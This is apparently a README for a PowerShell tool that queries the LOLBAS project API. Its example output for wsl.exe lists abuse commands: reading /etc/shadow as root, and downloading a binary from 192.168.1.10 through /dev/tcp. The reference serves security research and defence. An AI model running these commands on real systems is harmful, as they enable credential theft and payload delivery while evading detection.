## Uses the LOLBAS projects API to give CLI via Powershell
LOLBAS : https://lolbas-project.github.io/
LOLBAS API : https://lolbas-project.github.io/api/lolbas.json

e.g. to check for LOLBAS against 'wsl' (Windows Subsystem for Linux):

`.\get-lolbas.ps1 wsl`

```
PS C:\Users\Bazza\LOLBAS> .\get-lolbas.ps1 wsl 
get-lolbas.ps1 by @mcbazza
Searching LOLBAS for: wsl

Desc   : Executes calc.exe from wsl.exe
Command: wsl.exe -e /mnt/c/Windows/System32/calc.exe

Desc   : Cats /etc/shadow file as root
Command: wsl.exe -u root -e cat /etc/shadow

Desc   : Cats /etc/shadow file as root
Command: wsl.exe --exec bash -c 'cat file'

Desc   : Downloads file from 192.168.1.10
Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
```
